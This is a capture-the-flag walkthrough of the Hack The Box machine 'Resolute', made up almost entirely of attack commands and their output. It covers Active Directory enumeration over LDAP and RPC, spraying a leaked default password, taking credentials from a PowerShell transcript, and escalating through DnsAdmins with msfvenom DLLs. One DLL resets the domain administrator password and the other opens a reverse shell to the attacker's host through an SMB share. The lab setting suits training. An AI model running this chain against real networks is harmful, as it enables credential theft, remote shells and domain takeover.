# Resolute
## ldapsearch
## rpcclient
## windapsearch
## evil-winrm
## msfvenom
## dnscmd
## impacket-smbserver
## impacket-psexec
``````

➜  ~ sudo vi /etc/hosts

10.10.10.169 resolute.htb

➜  ~ rustscan -a resolute.htb --ulimit 5000

PORT      STATE SERVICE          REASON
88/tcp    open  kerberos-sec     syn-ack
135/tcp   open  msrpc            syn-ack
139/tcp   open  netbios-ssn      syn-ack
389/tcp   open  ldap             syn-ack
445/tcp   open  microsoft-ds     syn-ack
464/tcp   open  kpasswd5         syn-ack
593/tcp   open  http-rpc-epmap   syn-ack
3268/tcp  open  globalcatLDAP    syn-ack
3269/tcp  open  globalcatLDAPssl syn-ack
5985/tcp  open  wsman            syn-ack
9389/tcp  open  adws             syn-ack
47001/tcp open  winrm            syn-ack
49664/tcp open  unknown          syn-ack
49665/tcp open  unknown          syn-ack
49666/tcp open  unknown          syn-ack
49667/tcp open  unknown          syn-ack
49671/tcp open  unknown          syn-ack
49678/tcp open  unknown          syn-ack
49679/tcp open  unknown          syn-ack
49684/tcp open  unknown          syn-ack
49699/tcp open  unknown          syn-ack
49716/tcp open  unknown          syn-ack

➜  sudo nmap -Pn -sV -T4 -p- -oA ~/htb/Active_Directory_101/Resolute -vv resolute.htb

PORT      STATE SERVICE      REASON          VERSION
53/tcp    open  domain       syn-ack ttl 127 Simple DNS Plus
88/tcp    open  kerberos-sec syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2022-07-03 10:42:23Z)
135/tcp   open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn  syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap         syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds syn-ack ttl 127 Microsoft Windows Server 2008 R2 - 2012 microsoft-ds (workgroup: MEGABANK)
464/tcp   open  kpasswd5?    syn-ack ttl 127
593/tcp   open  ncacn_http   syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped   syn-ack ttl 127
3268/tcp  open  ldap         syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped   syn-ack ttl 127
5985/tcp  open  http         syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
9389/tcp  open  mc-nmf       syn-ack ttl 127 .NET Message Framing
47001/tcp open  http         syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
49664/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49665/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49666/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49667/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49671/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49678/tcp open  ncacn_http   syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
49679/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49684/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49716/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
Service Info: Host: RESOLUTE; OS: Windows; CPE: cpe:/o:microsoft:windows

➜  sudo nmap -Pn -A -T4 -p- -vv resolute.htb

PORT      STATE SERVICE      REASON          VERSION
53/tcp    open  domain       syn-ack ttl 127 Simple DNS Plus
88/tcp    open  kerberos-sec syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2022-07-03 10:44:45Z)
135/tcp   open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn  syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap         syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds syn-ack ttl 127 Windows Server 2016 Standard 14393 microsoft-ds (workgroup: MEGABANK)
464/tcp   open  kpasswd5?    syn-ack ttl 127
593/tcp   open  ncacn_http   syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped   syn-ack ttl 127
3268/tcp  open  ldap         syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped   syn-ack ttl 127
5985/tcp  open  http         syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf       syn-ack ttl 127 .NET Message Framing
47001/tcp open  http         syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49665/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49666/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49667/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49671/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49678/tcp open  ncacn_http   syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
49679/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49684/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49716/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 36523/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 52471/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 55070/udp): CLEAN (Timeout)
|   Check 4 (port 20307/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: Resolute
|   NetBIOS computer name: RESOLUTE\x00
|   Domain name: megabank.local
|   Forest name: megabank.local
|   FQDN: Resolute.megabank.local
|_  System time: 2022-07-03T03:45:46-07:00
|_clock-skew: mean: -2h33m00s, deviation: 4h02m30s, median: -4h53m01s
| smb2-time: 
|   date: 2022-07-03T10:45:47
|_  start_date: 2022-07-03T10:38:43

➜  ldapsearch -x -H ldap://resolute.htb -b 'dc=megabank,dc=local'

➜  ldapsearch -x -H ldap://resolute.htb -b 'dc=megabank,dc=local' > ldapsearch_results.txt

➜  cat ldapsearch_results.txt | grep -i userPrincipalName

userPrincipalName: ryan@megabank.local
userPrincipalName: marko@megabank.local
userPrincipalName: sunita@megabank.local
...

➜  cat ldapsearch_results.txt | grep -i userPrincipalName | awk '{ print $2 }' > user_emails.txt

ryan@megabank.local
marko@megabank.local
sunita@megabank.local
...

➜  cat user_emails.txt | awk -F '\\@' '{ print $1 }' > usernames.txt

ryan
marko
sunita
...

➜  rpcclient -U '' -N resolute.htb

Determine usernames through rpcclient:

rpcclient $> enumdomusers

Find relevant information pertaining to users:

rpcclient $> querydispinfo

Response:

index: 0x10a9 RID: 0x457 acb: 0x00000210 Account: marko	Name: Marko Novak	Desc: Account created. Password set to Welcome123!

Alternatively,

➜  windapsearch git:(master) ✗ ./windapsearch.py -d resoulute.megabank.local --dc-ip resolute.htb -U

Find Password related information:

➜  windapsearch git:(master) ✗ ./windapsearch.py -d resoulute.megabank.local --dc-ip resolute.htb -U --full | grep Password

Response:

description: Account created. Password set to Welcome123!

Determine if there is a password lockout value to avoid locking out accounts w/ password spray

➜  windapsearch git:(master) ✗ ldapsearch -x -H ldap://resolute.htb -b 'dc=megabank,dc=local' -s sub '*' | grep lock 

Response:

lockoutDuration: -18000000000
lockOutObservationWindow: -18000000000
lockoutThreshold: 0
lockoutDuration: -18000000000
lockOutObservationWindow: -18000000000
lockoutThreshold: 0

➜  crackmapexec smb resolute.htb -u usernames.txt -p 'Welcome123!' --continue-on-success

...
SMB         resolute.htb    445    RESOLUTE         [-] megabank.local\claude:Welcome123! STATUS_LOGON_FAILURE 
SMB         resolute.htb    445    RESOLUTE         [+] megabank.local\melanie:Welcome123! 
SMB         resolute.htb    445    RESOLUTE         [-] megabank.local\zach:Welcome123! STATUS_LOGON_FAILURE 
...

➜  Resolute evil-winrm -u melanie -p 'Welcome123!' -i resolute.htb
*Evil-WinRM* PS C:\Users\melanie\Documents> get-childitem -path C:\Users -include *.txt* -File -Recurse -ErrorAction SilentlyContinue

    Directory: C:\Users\melanie\Desktop

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---         7/3/2022   3:39 AM             34 user.txt

*Evil-WinRM* PS C:\Users\melanie\Documents> type C:\Users\melanie\Desktop\user.txt

user_flag

*Evil-WinRM* PS C:\Users\melanie\Documents> cd \
*Evil-WinRM* PS C:\> ls -force

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d--hs-        12/3/2019   6:40 AM                $RECYCLE.BIN
d--hsl        9/25/2019  10:17 AM                Documents and Settings
d-----        9/25/2019   6:19 AM                PerfLogs
d-r---        9/25/2019  12:39 PM                Program Files
d-----       11/20/2016   6:36 PM                Program Files (x86)
d--h--        9/25/2019  10:48 AM                ProgramData
d--h--        12/3/2019   6:32 AM                PSTranscripts
d--hs-        9/25/2019  10:17 AM                Recovery
d--hs-        9/25/2019   6:25 AM                System Volume Information
d-r---        12/4/2019   2:46 AM                Users
d-----        12/4/2019   5:15 AM                Windows
-arhs-       11/20/2016   5:59 PM         389408 bootmgr
-a-hs-        7/16/2016   6:10 AM              1 BOOTNXT
-a-hs-         7/3/2022   3:38 AM      402653184 pagefile.sys

*Evil-WinRM* PS C:\> cd PSTranscripts
*Evil-WinRM* PS C:\PSTranscripts> cd 20191203
*Evil-WinRM* PS C:\PSTranscripts\20191203> ls -force

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-arh--        12/3/2019   6:45 AM           3732 PowerShell_transcript.RESOLUTE.OJuoBGhU.20191203063201.txt


*Evil-WinRM* PS C:\PSTranscripts\20191203> type PowerShell_transcript.RESOLUTE.OJuoBGhU.20191203063201.txt

PS>CommandInvocation(Invoke-Expression): "Invoke-Expression"
>> ParameterBinding(Invoke-Expression): name="Command"; value="cmd /c net use X: \\fs01\backups ryan Serv3r4Admin4cc123!"

Potential found credentials:

ryan:Serv3r4Admin4cc123!

Verified with:

➜  ~ crackmapexec smb resolute.htb -u ryan -p 'Serv3r4Admin4cc123!'

SMB         resolute.htb    445    RESOLUTE         [*] Windows Server 2016 Standard 14393 x64 (name:RESOLUTE) (domain:megabank.local) (signing:True) (SMBv1:True)
SMB         resolute.htb    445    RESOLUTE         [+] megabank.local\ryan:Serv3r4Admin4cc123! (Pwn3d!)

➜  evil-winrm -u ryan -p 'Serv3r4Admin4cc123!' -i resolute.htb

*Evil-WinRM* PS C:\Users\ryan> whoami /groups

MEGABANK\DnsAdmins 

➜  msfvenom -p windows/x64/exec cmd='net user administrator c0rvu5! /domain' -f dll > c0rvu5.dll

➜  sudo impacket-smbserver share .

*Evil-WinRM* PS C:\> net use \\10.10.16.2\share
*Evil-WinRM* PS C:\> cmd /c dnscmd localhost /config /serverlevelplugindll \\10.10.16.2\share\c0rvu5.dll
*Evil-WinRM* PS C:\> sc.exe stop dns
*Evil-WinRM* PS C:\> sc.exe start dns

➜  sudo impacket-psexec megabank.local/administrator@10.10.10.169

Alternatively,

➜  msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.16.2 LPORT=10060 -f dll -o c0rvu5_2.dll
➜  sudo impacket-smbserver share .

*Evil-WinRM* PS C:\> net use \\10.10.16.2\share
*Evil-WinRM* PS C:\> cmd /c dnscmd localhost /config /serverlevelplugindll \\10.10.16.2\share\c0rvu5_2.dll

rlwrap will enhance the shell, allowing you to clear the screen with [CTRL] + [L]
-f . will make rlwrap use the current history file as a completion word list.
-r Put all words seen on in- and output on the completion list.

➜  sudo rlwrap -r -f . nc -lvnp 10060

*Evil-WinRM* PS C:\> sc.exe stop dns
*Evil-WinRM* PS C:\> sc.exe start dns

C:\Windows\system32> whoami

nt authority\system

C:\Windows\system32> powershell.exe get-childitem -path C:\Users -include *.txt* -File -Recurse -ErrorAction SilentlyContinue

    Directory: C:\Users\Administrator\Desktop

Mode                LastWriteTime         Length Name                          
----                -------------         ------ ----                          
-ar---         7/3/2022   6:01 AM             34 root.txt  

C:\Windows\system32> type C:\Users\melanie\Desktop\user.txt

user_flag

C:\Windows\system32> type C:\Users\Administrator\Desktop\root.txt 

root_flag

``````

![image](https://0xc0rvu5.github.io/docs/assets/images/20220703062500.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220703062550.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220703063740.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220703063707.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220703062808.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220703063109.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220703065300.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220703065512.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220703081444.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220703081406.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220703081826.png)

#hacking
